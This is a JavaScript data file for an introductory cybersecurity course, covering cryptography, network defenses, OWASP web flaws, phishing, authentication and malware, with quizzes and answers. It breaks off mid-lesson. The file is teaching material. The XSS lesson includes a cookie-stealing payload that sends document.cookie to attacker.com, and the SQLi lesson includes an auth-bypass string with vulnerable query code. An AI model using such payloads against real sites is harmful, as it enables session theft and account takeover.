// Cybersecurity Complete Course Data
// Formatted for dynamic catalog consumption and lesson viewer parsing

export const allPhases = [
  {
    id: "cy-phase-1",
    title: "Phase 1: Security Fundamentals, Cryptography & Networks (Weeks 1–2)",
    description: "Understand the CIA triad, symmetric/asymmetric encryption, SSL handshakes, network firewalls, and port scanning techniques.",
    modules: [
      {
        id: "cy-m-1",
        title: "Module 1: Cybersecurity Foundations & Network Defense",
        duration: "1 Week",
        difficulty: "Beginner",
        objectives: [
          "Explain Confidentiality, Integrity, and Availability (CIA)",
          "Compare symmetric encryption (AES) and key exchange (DH)",
          "Derive signatures using RSA asymmetric key pairs",
          "Configure security controls like Firewalls and IDS"
        ],
        lessons: [
          {
            id: "cy-l-1-1",
            title: "The CIA Triad & Basic Concepts",
            time: "45 min",
            summary: "Confidentiality, Integrity, Availability, AAA security controls, and authentication vs authorization.",
            content: `
### The CIA Triad & Basic Concepts

The core foundation of cybersecurity is defined by the **CIA Triad** (Confidentiality, Integrity, and Availability). Every security policy, tool, and framework is designed to protect one or more of these three principles.

#### The Three Core Principles:
1.  **Confidentiality:** Ensuring that sensitive data is accessed only by authorized individuals. (Protected via encryption, access control lists (ACLs), and MFA).
2.  **Integrity:** Guaranteeing that data is accurate, consistent, and has not been altered or tampered with by unauthorized parties. (Protected via cryptographic hashing, digital signatures, and file permissions).
3.  **Availability:** Ensuring that systems, networks, and data are accessible to authorized users when needed. (Protected via redundant backups, load balancing, and DDoS mitigation).

#### The AAA Framework:
*   **Authentication:** Verifying who a user is (e.g., entering a password).
*   **Authorization:** Determining what the user is allowed to do (e.g., file access permissions).
*   **Accounting:** Logging user actions for auditing (e.g., tracking who accessed a database).

#### Real-World Example:
In medical databases:
*   *Confidentiality:* Patient records are encrypted so only doctors can view them.
*   *Integrity:* Cryptographic hashes verify that prescriptions haven't been altered in transit to the pharmacy.
*   *Availability:* Redundant power generators ensure that hospital life-support machines stay connected during blackouts.

#### Quiz Questions:
1. **Which principle of the CIA Triad is compromised during a Ransomware attack that locks access to accounting files?**
   *   a) Confidentiality
   *   b) Integrity
   *   c) Availability (Correct)
2. **What is the difference between Authentication and Authorization?**
   *   a) Authentication grants access, Authorization logs actions
   *   b) Authentication verifies identity, Authorization determines permission limits (Correct)
   *   c) They are the same thing

#### Interview Questions:
* **How would you explain the difference between a vulnerability, a threat, and a risk?**
  *   *Answer:* A **vulnerability** is a weakness in a system (e.g., an unpatched software bug). A **threat** is a potential danger that could exploit that weakness (e.g., a hacker with an exploit kit). A **risk** is the probability and impact of the threat successfully exploiting the vulnerability (e.g., the likelihood of getting hacked and losing $10,000).
* **Explain how non-repudiation is achieved in transactions.**
  *   *Answer:* Non-repudiation ensures a sender cannot deny sending a message. It is achieved using public-key cryptography and digital signatures, where the sender's private key signs the hash of the message, proving authenticity beyond doubt.

#### Summary:
The CIA Triad guides security designs. Confidentiality prevents leaks, Integrity blocks tampering, and Availability ensures uptime. AAA logs and controls user access.
            `,
            exercise: "Review a security breach case study (e.g., the Equifax breach) and write a short summary mapping the failures to the CIA Triad."
          },
          {
            id: "cy-l-1-2",
            title: "Cryptographic Hash Functions & Symmetric Encryption",
            time: "50 min",
            summary: "MD5, SHA-256 integrity checks, symmetric encryption (AES), and Diffie-Hellman key exchanges.",
            content: `
### Cryptographic Hash Functions & Symmetric Encryption

Cryptography is divided into two main categories: symmetric encryption (shared secret) and asymmetric encryption (public/private key pairs).

#### 1. Cryptographic Hashing:
One-way mathematical functions converting data into a fixed-length signature. Primarily used for integrity audits:
*   *MD5 / SHA-1:* Deprecated due to **collision vulnerabilities** (attackers can generate identical hashes for different files).
*   *SHA-256 / SHA-3:* The modern standard for secure file and transaction checksum validation.

#### 2. Symmetric Encryption:
Uses the **same key** for both encryption and decryption.
*   *AES (Advanced Encryption Standard):* The global standard for encrypting data at rest (e.g., database encryption, hard drive encryption). Extremely fast.
*   *Key Exchange Problem:* How do Alice and Bob agree on the shared secret key over an unsecure channel without an eavesdropper intercepting it? Resolved using **Diffie-Hellman Key Exchange**.

#### Python Symmetric AES Example:
\`\`\`python
# Concept demonstration using cryptography library:
from cryptography.fernet import Fernet

# Generate and share key:
key = Fernet.generate_key()
cipher = Fernet(key)

# Encrypt:
token = cipher.encrypt(b"Top Secret Credentials")
print("Encrypted:", token)

# Decrypt:
plain_text = cipher.decrypt(token)
print("Decrypted:", plain_text.decode())
\`\`\`

#### Quiz Questions:
1. **Which cryptographic algorithm is a symmetric encryption standard used globally?**
   *   a) RSA
   *   b) AES (Correct)
   *   c) SHA-256
2. **What is a collision in cryptographic hashing?**
   *   a) Two different inputs producing the exact same hash output (Correct)
   *   b) A server network crash
   *   c) An authentication timeout

#### Interview Questions:
* **How does Diffie-Hellman Key Exchange allow two parties to agree on a secret key over a public network?**
  *   *Answer:* It relies on the mathematical difficulty of computing discrete logarithms. Both parties exchange public values derived from their private keys and a shared base. Using these values, they calculate the same shared secret, while an eavesdropper cannot derive it from the public exchange.
* **Why are MD5 and SHA-1 no longer recommended for secure hashing?**
  *   *Answer:* Due to collision attacks. Modern compute power makes it possible to create two different files (e.g., a clean executable and a trojan) that hash to the exact same value, allowing attackers to bypass code signature audits.

#### Summary:
Hashing validates integrity. Symmetric encryption uses a single shared key for fast encryption, requiring secure exchanges like Diffie-Hellman to setup keys.
            `,
            exercise: "Generate an AES key pair locally using a Python script, encrypt a secret message string, and decrypt it successfully."
          },
          {
            id: "cy-l-1-3",
            title: "Public Key Cryptography & Digital Signatures",
            time: "50 min",
            summary: "Asymmetric RSA mechanics, public/private keys, and digital signature validation.",
            content: `
### Public Key Cryptography & Digital Signatures

Asymmetric cryptography uses a linked pair of keys: a public key to encrypt and a private key to decrypt.

#### Encryption vs. Digital Signatures:
1.  **Confidentiality (Asymmetric Encryption):**
    *   Alice encrypts a message using **Bob's Public Key**.
    *   Only Bob can decrypt it using **Bob's Private Key**.
2.  **Authenticity & Integrity (Digital Signature):**
    *   Alice hashes a message and encrypts the hash using **Alice's Private Key** (producing a signature).
    *   Bob decrypts the signature using **Alice's Public Key** and compares the hash to the message hash. If they match, it proves Alice sent it and it hasn't changed.

#### Digital Signature Workflow:
\`\`\`
[Alice's Message] ---> Hash Output ---> Encrypt with Alice's Private Key ---> [Signature]
                                                                                  |
[Bob receives message & signature] ---> Decrypt Signature with Alice's Public Key = Match?
\`\`\`

#### Quiz Questions:
1. **To send an encrypted message that only Bob can read, which key should Alice use?**
   *   a) Alice's Private Key
   *   b) Bob's Public Key (Correct)
   *   c) Bob's Private Key
2. **A digital signature is created by encrypting a file hash with which key?**
   *   a) The sender's private key (Correct)
   *   b) The receiver's public key
   *   c) A symmetric session key

#### Interview Questions:
* **How does public key cryptography solve the key distribution problem of symmetric encryption?**
  *   *Answer:* Asymmetric cryptography eliminates the need to share a secret key. Public keys are shared openly with the world, allowing anyone to encrypt messages, while private keys never leave the owner's system.
* **Explain how RSA encryption relies on prime factorization.**
  *   *Answer:* RSA security is based on the mathematical difficulty of factoring the product of two large prime numbers. While multiplying two prime numbers is computationally simple, finding the prime factors of a large number (e.g., 2048-bit integer) is practically impossible with classical computers.

#### Summary:
Asymmetric encryption uses public keys to encrypt for confidentiality and private keys to decrypt. Digital signatures encrypt hashes with private keys to prove authenticity.
            `,
            exercise: "Create a mock SSH key pair on your machine, noting the naming difference between the private key file and the .pub public key file."
          },
          {
            id: "cy-l-1-4",
            title: "Network Protocols & Handshakes",
            time: "55 min",
            summary: "TCP three-way handshake, DNS security limits, and SSL/TLS cryptographic handshakes.",
            content: `
### Network Protocols & Handshakes

To secure networks, you must understand how devices communicate. Network security analysts audit protocol packets and connection handshakes.

#### 1. TCP Three-Way Handshake:
TCP establishes connections reliably using a synchronise/acknowledge sequence:
1.  **SYN:** Client sends a synchronization packet containing a sequence number.
2.  **SYN-ACK:** Server acknowledges and sends its synchronization packet.
3.  **ACK:** Client acknowledges back, establishing the session.
*Target Attack:* A **SYN Flood** attack leaves connections half-open, running out of server resources (DoS).

#### 2. SSL/TLS Handshake:
Secures HTTP traffic (HTTPS) by negotiating symmetric keys using asymmetric cryptography:
1.  *Client Hello:* Specifies TLS version and supported cipher suites.
2.  *Server Hello:* Sends server's SSL certificate (containing public key).
3.  *Key Agreement:* Client verifies the certificate with a Certificate Authority (CA), generates a pre-master secret, encrypts it with the server's public key, and sends it.
4.  *Symmetric Shift:* Both generate a symmetric session key for fast data encryption.

#### Quiz Questions:
1. **Which TCP flags are set in the second step of the TCP three-way handshake?**
   *   a) SYN-FIN
   *   b) SYN-ACK (Correct)
   *   c) RST-URG
2. **Why does the TLS handshake switch to symmetric encryption after exchanging keys asymmetrically?**
   *   a) Symmetric encryption is more secure
   *   b) Symmetric encryption is computationally much faster for encrypting data payload (Correct)
   *   c) Asymmetric keys are not supported by browsers

#### Interview Questions:
* **How does a SYN flood attack exploit the TCP handshake?**
  *   *Answer:* The attacker sends thousands of SYN packets using spoofed source IP addresses. The server responds with SYN-ACKs to each and reserves memory slots waiting for the final ACKs. Since the client never responds, the server's connection slots fill up, crashing the service.
* **What is the role of a Certificate Authority (CA) in a TLS handshake?**
  *   *Answer:* A CA is a trusted third party that signs the server's SSL certificate. Browsers ship with pre-installed public keys of trusted CAs, allowing them to verify that the certificate presented by a website is genuine and not a man-in-the-middle spoof.

#### Summary:
TCP uses a SYN, SYN-ACK, ACK sequence. TLS handshakes establish secure HTTPS sessions by exchanging certificates asymmetrically, then switching to symmetric keys.
            `,
            exercise: "Write down the exact network commands to verify if a server is listening on port 443 using telnet or nc (netcat) tools."
          },
          {
            id: "cy-l-1-5",
            title: "Network Security Controls: Firewalls, IDS & IPS",
            time: "45 min",
            summary: "Packet-filtering, stateful firewalls, intrusion detection vs intrusion prevention, and signature vs anomaly detection.",
            content: `
### Network Security Controls: Firewalls, IDS & IPS

Network traffic is monitored and protected using defensive controls deployed at the perimeter or inside subnet zones.

#### 1. Firewalls:
*   **Packet-Filtering:** Inspects packet headers (source IP, destination IP, port) stateless.
*   **Stateful Firewalls:** Tracks connection states, automatically allowing replies.
*   **Next-Generation Firewalls (NGFW):** Inspects the application payload (Deep Packet Inspection), blocking malware.

#### 2. IDS vs. IPS:
*   **IDS (Intrusion Detection System):** A passive monitor that copies network traffic. It logs anomalies and alerts administrators but **does not block** traffic.
*   **IPS (Intrusion Prevention System):** Deployed inline. It inspects and actively **blocks** malicious packets.

#### Detection Methods:
*   *Signature-Based:* Looks for known patterns (e.g., comparing packet hashes to known malware). Fast but cannot detect zero-day exploits.
*   *Anomaly-Based:* Establishes a baseline of normal traffic. Alerts if traffic deviates (e.g., 10GB data transfer at 2 AM). Detects zero-days but has higher false-positive rates.

#### Quiz Questions:
1. **What is the difference between an IDS and an IPS?**
   *   a) IDS blocks traffic, IPS alerts administrators
   *   b) IDS only detects and alerts, IPS is deployed inline to actively block threats (Correct)
   *   c) IDS requires a private network, IPS runs on public internet
2. **Which detection method identifies new, unknown zero-day attacks by looking for deviations from normal behavior?**
   *   a) Signature-based detection
   *   b) Anomaly-based detection (Correct)
   *   c) Static file hashing

#### Interview Questions:
* **Why would an organization deploy both an internal firewall and a perimeter firewall?**
  *   *Answer:* To implement defense-in-depth. A perimeter firewall blocks external threats. An internal firewall segments subnets (e.g., separating development from finance), preventing an attacker who compromises one server from moving laterally through the network.
* **Explain how signature-based systems are bypassed by polymorphic malware.**
  *   *Answer:* Polymorphic malware alters its file structure, code order, or encryption keys every time it spreads, altering its cryptographic signature hash while preserving its malicious function. This bypasses signature databases.

#### Summary:
Firewalls control traffic at boundaries. IDS detects and warns, while IPS blocks active attacks. Anomaly detection catches new threats by flagging deviations from baseline behavior.
            `,
            exercise: "Research the differences between a stateless firewall and a stateful firewall, and write a summary paragraph detailing their performance tradeoffs."
          }
        ]
      },
      {
        id: "cy-m-2",
        title: "Module 2: Web Application Vulnerabilities & Threat Vectors",
        duration: "1 Week",
        difficulty: "Intermediate",
        objectives: [
          "Identify and patch SQL Injection vulnerabilities",
          "Differentiate Stored, Reflected, and DOM-based Cross-Site Scripting (XSS)",
          "Formulate anti-CSRF token defense mechanisms",
          "Detect IDOR and broken access control structures"
        ],
        lessons: [
          {
            id: "cy-l-2-1",
            title: "OWASP Top 10: SQL Injection (SQLi)",
            time: "55 min",
            summary: "SQLi mechanics, vulnerable queries, parameterized statements, and auditing database inputs.",
            content: `
### OWASP Top 10: SQL Injection (SQLi)

SQL Injection occurs when untrusted user input is concatenated directly into a database query string, allowing the input to alter the SQL structure.

#### Vulnerable Code Example (Node.js):
\`\`\`javascript
// VULNERABLE SQL QUERY CONSTRUCT:
const query = \`SELECT * FROM users WHERE username = '\${req.body.user}' AND password = '\${req.body.pass}'\`;
db.query(query);
\`\`\`
If the attacker inputs \`admin' OR '1'='1\` into the user field, the query evaluates to:
\`\`\`sql
SELECT * FROM users WHERE username = 'admin' OR '1'='1' AND password = ''
\`\`\`
Since \`'1'='1\` is always true, the database returns records, bypassing authentication.

#### Secured Code (Prepared Statements):
Prepared statements pre-compile the SQL query structure, treating user inputs strictly as parameters (data), not executable commands.
\`\`\`javascript
// SECURED PREPARED STATEMENT:
const query = "SELECT * FROM users WHERE username = ? AND password = ?";
db.query(query, [req.body.user, req.body.pass]); // Inputs are safely bound
\`\`\`

#### Quiz Questions:
1. **What is the root cause of SQL Injection vulnerabilities?**
   *   a) Database storage size errors
   *   b) Concatenating untrusted user input directly into executable SQL query strings (Correct)
   *   c) Running query databases on port 80
2. **Which technique separates query logic from data inputs to prevent SQLi?**
   *   a) String replacement
   *   b) Parameterized queries (Prepared Statements) (Correct)
   *   c) Base64 encoding

#### Interview Questions:
* **How do prepared statements prevent SQL Injection?**
  *   *Answer:* Prepared statements pre-compile the SQL query on the database engine first, defining the query structure. When user inputs are passed, the database handles them strictly as parameters (data constants) inside a placeholder slot, preventing them from modifying the query structure.
* **What is Blind SQL Injection?**
  *   *Answer:* Blind SQLi occurs when the web application does not output database records or error messages directly. The attacker must infer data by asking true/false questions and measuring database response times (Time-Based) or page changes (Boolean-Based).

#### Summary:
SQLi compromises databases by injecting malicious commands through input fields. It is mitigated using prepared statements and input validation.
            `,
            exercise: "Write a secure database query in Node.js or Python that checks a user's input safely using placeholders."
          },
          {
            id: "cy-l-2-2",
            title: "OWASP Top 10: Cross-Site Scripting (XSS)",
            time: "55 min",
            summary: "Stored, Reflected, and DOM-based XSS attacks, session stealing, and output encoding.",
            content: `
### OWASP Top 10: Cross-Site Scripting (XSS)

XSS allows attackers to inject malicious client-side scripts (usually JavaScript) into trusted web pages viewed by other users.

#### XSS Types:
1.  **Stored XSS (Persistent):** The malicious script is saved in the database (e.g., a forum post comment) and runs whenever users load the page.
    *   *Payload:* \`<script>fetch('http://attacker.com/steal?cookie=' + document.cookie)</script>\`
2.  **Reflected XSS (Non-Persistent):** The script is passed via a URL query parameter and reflected back immediately by the server response.
    *   *URL:* \`http://site.com/search?q=<script>alert(1)</script>\`
3.  **DOM-Based XSS:** The vulnerability exists entirely in client-side JavaScript, where code reads from user inputs and writes to the DOM unsafely (e.g., \`element.innerHTML = location.hash\`).

#### Mitigations:
*   **HTML Entity Encoding:** Convert characters like \`<\` to \`&lt;\` and \`>\` to \`&gt;\` so browsers render them as text rather than executable scripts.
*   **HttpOnly Cookies:** Prevents client-side scripts from reading session cookies via \`document.cookie\`.

#### Quiz Questions:
1. **Which XSS type stores the malicious script permanently in the database?**
   *   a) Reflected XSS
   *   b) Stored XSS (Correct)
   *   c) DOM XSS
2. **How does setting the HttpOnly flag on a cookie improve security?**
   *   a) It encrypts the cookie data
   *   b) It restricts client-side scripts from accessing the cookie via JavaScript (Correct)
   *   c) It deletes the cookie when the browser closes

#### Interview Questions:
* **How would you defend a web application against Stored XSS?**
  *   *Answer:* You should implement context-aware output encoding before rendering user data in the browser, sanitize input fields using libraries like DOMPurify, and define a strong Content Security Policy (CSP) header.
* **Explain how DOM-based XSS differs from Reflected XSS.**
  *   *Answer:* Reflected XSS occurs when the malicious script is processed by the backend server and included in the HTML response. DOM-based XSS executes entirely in the client-side browser, where Javascript reads from an input source (like the URL hash) and writes it directly to the DOM unsafely.

#### Summary:
XSS injects malicious JavaScript into user browsers. Stored XSS saves scripts in databases, Reflected XSS echoes inputs from URLs, and DOM XSS runs client-side. Mitigation requires HTML output encoding and HttpOnly cookies.
            `,
            exercise: "Write an HTML sanitizer helper function in JavaScript that escapes angle brackets to prevent script executions."
          },
          {
            id: "cy-l-2-3",
            title: "Cross-Site Request Forgery (CSRF)",
            time: "50 min",
            summary: "Unauthorized action state transfers, session trust mechanics, and anti-CSRF token defenses.",
            content: `
### Cross-Site Request Forgery (CSRF)

CSRF forces an authenticated user to execute unauthorized actions on a web application they are logged into. The attack exploits the trust a website has in the user's browser session.

#### How the Attack Works:
1.  Alice logs into her bank website: \`bank.com\`. The bank sets a session cookie in her browser.
2.  Alice visits a malicious site: \`evil.com\` in another tab.
3.  \`evil.com\` contains an hidden form that automatically submits a POST request to \`bank.com/transfer\` targeting the attacker's account.
4.  Because browsers automatically attach stored cookies for a domain to all requests targeting that domain, the bank processes the transfer, thinking Alice authorized it.

#### Mitigations:
1.  **Anti-CSRF Tokens (Synchronizer Token Pattern):** The server generates a unique, unpredictable token, includes it in forms, and validates it on POST requests. A malicious site cannot read this token due to Same-Origin Policies.
2.  **SameSite Cookie Attribute:**
    *   \`SameSite=Strict\`: Cookies are never sent on cross-site requests (e.g., clicking a link from an external site).
    *   \`SameSite=Lax\`: Cookies are sent on standard top-level link navigations but blocked on forms or script requests.

#### SameSite Cookie Header Example:
\`\`\`http
Set-Cookie: session_id=xyz123; Secure; HttpOnly; SameSite=Strict
\`\`\`

#### Quiz Questions:
1. **What mechanism do browsers use that causes CSRF by sending stored session credentials automatically?**
   *   a) Auto-filling forms
   *   b) Automatic cookie forwarding for the target domain (Correct)
   *   c) Saving passwords
2. **Which SameSite cookie attribute prevents cookies from being sent on any cross-site request?**
   *   a) SameSite=None
   *   b) SameSite=Lax
   *   c) SameSite=Strict (Correct)

#### Interview Questions:
* **How do Anti-CSRF tokens prevent attacks if cookies are sent automatically?**
  *   *Answer:* The token is an unpredictable, unique value generated by the server and embedded inside the HTML form body or custom headers. When a request is submitted, the server matches the form token against the session token. A malicious site can trigger the request but cannot read or spoof the token because of Same-Origin Policy limits.
* **Why does CSRF not apply to read-only API calls?**
  *   *Answer:* Because CSRF targets state-changing actions (like modifying passwords or transfers). Reading data requires the attacker to capture the response, which is blocked by the browser's Same-Origin Policy unless CORS headers allow it.

#### Summary:
CSRF forces authenticated browsers to submit unauthorized actions. It is prevented using anti-CSRF tokens and setting SameSite cookie attributes.
            `,
            exercise: "Draft an HTTP header response setting a secure session cookie with Secure, HttpOnly, and SameSite=Lax flags."
          },
          {
            id: "cy-l-2-4",
            title: "Broken Access Control & IDOR",
            time: "50 min",
            summary: "Privilege escalation, IDOR vulnerabilities, mapping URL parameters, and authorization validations.",
            content: `
### Broken Access Control & IDOR

Access control ensures that users cannot access resources or execute actions outside of their permissions.

#### IDOR (Insecure Direct Object Reference):
IDOR occurs when an application exposes a direct reference to a database object (like a user ID, invoice number, or file path) in a URL or API parameter, without validating if the logged-in user owns that object.

#### Vulnerable IDOR Example:
An application displays a profile page at:
\`\`\`
https://site.com/profile?userid=1024
\`\`\`
An attacker logs in as user \`1025\` and alters the URL query parameter to \`userid=1024\`. If the application displays user 1024's profile data without validating if the current session matches the user ID, it is vulnerable to IDOR.

#### Mitigation:
*   **Validate Ownership:** Never assume that the user requesting a file is authorized. Always verify permissions against the session ID:
    \`\`\`javascript
    // SECURED AUTHORIZATION CHECK:
    const currentUser = req.session.userId;
    const targetInvoice = req.query.invoiceId;
    
    const invoice = await db.getInvoice(targetInvoice);
    if (invoice.ownerId !== currentUser) {
        return res.status(403).send("Forbidden: You do not own this resource");
    }
    \`\`\`
*   **Use Indirect References:** Use random, non-sequential UUIDs (e.g., \`550e8400-e29b-41d4-a716-446655440000\`) instead of sequential database auto-incrementing integers.

#### Quiz Questions:
1. **What is an IDOR vulnerability?**
   *   a) A buffer overflow error
   *   b) Accessing a resource directly by changing a parameter reference without authorization checks (Correct)
   *   c) An expired encryption key
2. **Which design choice helps mitigate IDOR attacks?**
   *   a) Hiding input fields
   *   b) Using non-sequential UUIDs and validating ownership on every request (Correct)
   *   c) Using symmetric keys

#### Interview Questions:
* **How would you differentiate between Vertical and Horizontal Privilege Escalation?**
  *   *Answer:* Vertical privilege escalation occurs when a standard user gains access to admin permissions. Horizontal privilege escalation occurs when a user accesses resources belonging to another user of the same privilege level (e.g., accessing another user's bank invoices).
* **Why does using UUIDs not completely solve IDOR?**
  *   *Answer:* UUIDs are hard to guess, which reduces risk, but they are still direct object references. If a UUID leaks or is captured, and the backend lacks authorization checks, an attacker can still access the resource. The only complete fix is validating user ownership on every request.

#### Summary:
IDOR vulnerabilities occur when direct object references are modified to bypass access controls. Secure apps validate session ownership on all queries and use UUIDs.
            `,
            exercise: "Write an authorization gate middleware in Node.js or Python that checks if the request session owner matches the requested file owner."
          },
          {
            id: "cy-l-2-5",
            title: "Social Engineering & Phishing Attacks",
            time: "40 min",
            summary: "Credential harvesting, spear-phishing, tailgating, and multi-factor authentication bypass methods.",
            content: `
### Social Engineering & Phishing Attacks

Security is not just about code and firewalls; it is also about human behavior. Social engineering exploits human trust, curiosity, or fear to gain access.

#### Common Attack Vectors:
*   **Phishing:** Mass emails spoofing trusted entities (banks, IT support) containing links to fake login portals to harvest credentials.
*   **Spear-Phishing:** Targeted attacks customizing emails using personal details (gathered from LinkedIn or public profiles) to target high-value individuals (CEOs, financial managers).
*   **Tailgating (Physical):** An attacker follows an authorized employee through a locked door to gain physical access to a corporate office or datacenter.
*   **MFA Fatigue (Push Bombing):** Attackers bomb a user's phone with MFA approval push notifications until the user accidentally clicks 'Approve' to stop the alerts.

#### Real-World Example:
In the Twitter hack of 2020, attackers used phone-based spear-phishing to target Twitter employees, claiming to be from the internal IT support team. They convinced the employees to log into a fake VPN page, capturing their credentials and accessing internal admin panels.

#### Quiz Questions:
1. **What is spear-phishing?**
   *   a) Sending broad phishing emails to millions of users
   *   b) A targeted phishing attack directed at specific individuals using custom details (Correct)
   *   c) Phishing via SMS text messages
2. **Which attack involves following a worker physically through a secured building door?**
   *   a) Tailgating (Correct)
   *   b) Phishing
   *   c) XSS

#### Interview Questions:
* **How would you train employees to detect phishing attempts?**
  *   *Answer:* Train them to inspect email headers for domain alignment, look for urgent language requesting actions, verify the target URL domain before logging in, and avoid downloading attachments from unverified sources.
* **What is the difference between phishing, vishing, and smishing?**
  *   *Answer:* Phishing targets victims via email. Vishing (Voice Phishing) targets victims via phone calls using social engineering. Smishing (SMS Phishing) targets victims via text messages containing malicious links.

#### Summary:
Social engineering targets human vulnerabilities. Phishing exploits trust via email to harvest credentials, requiring user training and strict MFA policies to mitigate.
            `,
            exercise: "Review an email received in your inbox. Trace its headers (SPF, DKIM, DMARC alignment) to verify if the sender is authenticated."
          }
        ]
      }
    ]
  },
  {
    id: "cy-phase-2",
    title: "Phase 2: Authentication, Vulnerability Analysis & Incident Management (Weeks 3–4)",
    description: "Write salted password hashes, audit stack buffer overflows, execute Nmap port scans, run SIEM audits, and implement Zero Trust.",
    modules: [
      {
        id: "cy-m-3",
        title: "Module 3: System Security, Malware & Authentication",
        duration: "1 Week",
        difficulty: "Intermediate-Advanced",
        objectives: [
          "Evaluate authentication models and OAuth2 flows",
          "Apply bcrypt cryptographic hashing with salt values",
          "Classify malware signatures and ransomware threads",
          "Identify C/C++ memory buffer overflow vulnerabilities"
        ],
        lessons: [
          {
            id: "cy-l-3-1",
            title: "Authentication Models",
            time: "50 min",
            summary: "Single-factor vs multi-factor, MFA types, OAuth2 delegation flows, and SSO security.",
            content: `
### Authentication Models

Authentication is the process of validating a user's identity. Modern security requires multi-layered authentication to protect against credential compromises.

#### Authentication Factors:
1.  **Something You Know:** Passwords, PINs, security questions.
2.  **Something You Have:** Hardware tokens, phone push notifications, authenticator apps (TOTP - Time-Based One-Time Password).
3.  **Something You Are (Biometrics):** Fingerprint scans, facial recognition.
4.  **Somewhere You Are (Location):** Geofencing checks.

#### OAuth2 & OpenID Connect (OIDC):
Delegated authorization frameworks allowing websites to access resources on another site without seeing user passwords:
*   *Access Token:* A signed token (like a JWT) representing authorization.
*   *Flow:* User logs into OAuth Provider (e.g., Google) -> Provider issues code -> Website exchanges code for Access Token -> Website accesses resources.

#### Quiz Questions:
1. **Entering a password and receiving a TOTP code on your mobile authenticator app represents which model?**
   *   a) Single-Factor Authentication
   *   b) Multi-Factor Authentication (MFA) (Correct)
   *   c) Identity federation
2. **What does OAuth2 primarily handle?**
   *   a) Data encryption
   *   b) Delegated authorization (Correct)
   *   c) Network routing

#### Interview Questions:
* **How does a TOTP (Time-Based One-Time Password) algorithm generate codes without internet access?**
  *   *Answer:* Both the server and the app share a secret key. They hash the secret key combined with the current time slot (typically changing every 30 seconds) using the HMAC-SHA1 algorithm. Since both have the same secret and time, they compute identical codes locally.
* **What is the risk of using SMS for Multi-Factor Authentication?**
  *   *Answer:* SMS is vulnerable to SIM-swapping attacks (social engineering a carrier to assign a victim's phone number to an attacker's SIM) and SS7 network interception, allowing hackers to capture OTP codes.

#### Summary:
MFA combines multiple independent factors (know, have, are) to verify identity. OAuth2 facilitates secure API access authorization without exposing user credentials.
            `,
            exercise: "Configure a Google Authenticator account using a QR code, noting how a secret key connects the app to the provider."
          },
          {
            id: "cy-l-3-2",
            title: "Password Security & Salting",
            time: "50 min",
            summary: "Hashing passwords, why MD5 is insecure, applying random salt, and work factors in bcrypt.",
            content: `
### Password Security & Salting

Never save plain passwords in a database! If the database is stolen, all user accounts are compromised immediately.

#### The Salting and Hashing Solution:
1.  **Cryptographic Hash:** Convert passwords to unique strings.
2.  **The Salt:** A randomly generated string appended to the user's password *before* hashing. The salt is stored in the database alongside the hash.
    *   *Why Salt?* It prevents attackers from using pre-calculated hash tables (**Rainbow Tables**) to crack passwords.
3.  **Key Stretching (Work Factor):** Slow algorithms (like \`bcrypt\` or \`Argon2\`) run the hash function thousands of times recursively. This makes hashing computationally expensive for attackers, slowing down brute-force attempts.

#### Salted Hash Node.js Example (bcrypt):
\`\`\`javascript
const bcrypt = require('bcrypt');

async function hashPassword(plainPassword) {
    const saltRounds = 12; // Work factor: 2^12 iterations
    const hashedPassword = await bcrypt.hash(plainPassword, saltRounds);
    console.log("Hash stored in DB:", hashedPassword);
}

async function verifyPassword(plainPassword, dbHash) {
    const isMatch = await bcrypt.compare(plainPassword, dbHash);
    console.log("Matches:", isMatch);
}
\`\`\`

#### Quiz Questions:
1. **What is the primary purpose of password salting?**
   *   a) To make passwords shorter
   *   b) To prevent the use of pre-computed Rainbow Tables by ensuring identical passwords have unique hashes (Correct)
   *   c) To encrypt databases
2. **Why are MD5 and SHA-256 not recommended for password hashing?**
   *   a) They are not deterministic
   *   b) They are too slow
   *   c) They are too fast, allowing attackers to check millions of hashes per second during brute force (Correct)

#### Interview Questions:
* **How does a Rainbow Table attack work, and how does salting defend against it?**
  *   *Answer:* A rainbow table is a pre-computed database of common passwords and their corresponding hashes. If an attacker steals a hashed database, they look up the hashes in the table to instantly find the passwords. Salting appends a unique random string to each password, rendering pre-computed tables useless since the hash changes.
* **What is a work factor in bcrypt?**
  *   *Answer:* The work factor (or cost) determines the number of hashing rounds. Increasing the work factor by 1 doubles the time it takes to compute the hash, allowing developers to scale hashing difficulty to keep up with faster CPU hardware.

#### Summary:
Password security requires slow hashing algorithms (bcrypt/Argon2) combined with unique salts. This prevents brute-force attempts and rainbow table lookups.
            `,
            exercise: "Write a short Node.js script using the bcrypt library to generate a salted password hash and test password verification."
          },
          {
            id: "cy-l-3-3",
            title: "Malware Classifications",
            time: "45 min",
            summary: "Viruses, worms, trojans, ransomware, rootkits, and behavior-based analysis.",
            content: `
### Malware Classifications

Malware (Malicious Software) is code designed to compromise system confidentiality, integrity, or availability.

#### Common Classifications:
*   **Virus:** Malicious code that attaches itself to clean executables. It requires human action (e.g., running the file) to replicate and spread.
*   **Worm:** Self-replicating malware that spreads across networks automatically by exploiting software vulnerabilities, without human intervention.
*   **Trojan:** Software disguised as a clean application that hides malicious code (e.g., a free game that installs a keylogger).
*   **Ransomware:** Encrypts user files and demands payment in cryptocurrency to restore access.
*   **Rootkit:** Malware that hides deep in the operating system kernel, making it invisible to standard task managers and antivirus software.

#### Real-World Example:
The **WannaCry** ransomware attack of 2017 acted as a worm. It automatically scanned networks for Windows machines vulnerable to the EternalBlue exploit, infected them, encrypted their files, and spread to other connected computers, causing global disruptions.

#### Quiz Questions:
1. **Which type of malware can self-replicate and spread across network connections automatically without human action?**
   *   a) Trojan
   *   b) Virus
   *   c) Worm (Correct)
2. **What is a rootkit?**
   *   a) A tool used to clean databases
   *   b) Malware designed to conceal its presence at the OS kernel level (Correct)
   *   c) A phishing email template

#### Interview Questions:
* **What is the difference between signature-based and behavior-based antivirus detection?**
  *   *Answer:* Signature-based detection matches file hashes against databases of known malware. Behavior-based detection monitors what a program does (e.g., trying to write to host files or hook into other processes), allowing it to block zero-day threats.
* **How would you defend an enterprise network against ransomware?**
  *   *Answer:* Implement offline, immutable backups, keep operating systems patched, restrict administrative privileges, use Endpoint Detection and Response (EDR) software, and run network segmentation.

#### Summary:
Malware categories are defined by how they replicate and execute. Worms spread automatically, Trojans hide inside clean files, and rootkits hide at the kernel level.
            `,
            exercise: "Research the Stuxnet worm and write a brief analysis detailing its targeted infection vector and lifecycle."
          },
          {
            id: "cy-l-3-4",
            title: "Privilege Escalation & OS Hardening",
            time: "45 min",
            summary: "Access control lists, system configuration baselines, unpatched vulnerabilities, and security auditing.",
            content: `
